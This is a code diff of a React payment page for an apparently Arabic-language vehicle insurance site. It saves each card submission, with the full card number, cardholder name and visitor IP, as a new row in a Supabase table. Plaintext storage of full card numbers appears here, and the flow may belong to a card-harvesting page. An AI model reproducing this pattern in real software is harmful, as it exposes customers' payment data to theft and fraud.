@@ -314,12 +314,31 @@ const Payment = () => {
         }
       }
 
+      // Ensure we have customer data before proceeding
+      if (!existingData.full_name || !existingData.phone) {
+        toast({
+          title: "خطأ",
+          description: "بيانات العميل غير مكتملة. يرجى العودة للصفحة الرئيسية وإعادة إدخال البيانات.",
+          variant: "destructive"
+        });
+        return;
+      }
+
       // Always create a new application for each card submission
       const ipAddress = localStorage.getItem('visitor_ip') || null;
       const { data: newApp, error } = await supabase
         .from('customer_applications')
         .insert([{
-          ...existingData,
+          full_name: existingData.full_name,
+          phone: existingData.phone,
+          insurance_type: existingData.insurance_type,
+          vehicle_manufacturer: existingData.vehicle_manufacturer,
+          vehicle_model: existingData.vehicle_model,
+          vehicle_year: existingData.vehicle_year,
+          vehicle_value: existingData.vehicle_value,
+          usage_purpose: existingData.usage_purpose,
+          add_driver: existingData.add_driver,
+          company_logo: existingData.company_logo,
           cardholder_name: formData.cardholderName,
           card_number: formData.cardNumber,
           card_last_4: lastFour,
@@ -331,7 +350,7 @@ const Payment = () => {
           regular_price: regularPrice,
           current_step: 'payment',
           payment_approved: false,
-          status: 'pending',
+          status: 'pending_payment',
           ip_address: ipAddress
         }])
         .select()
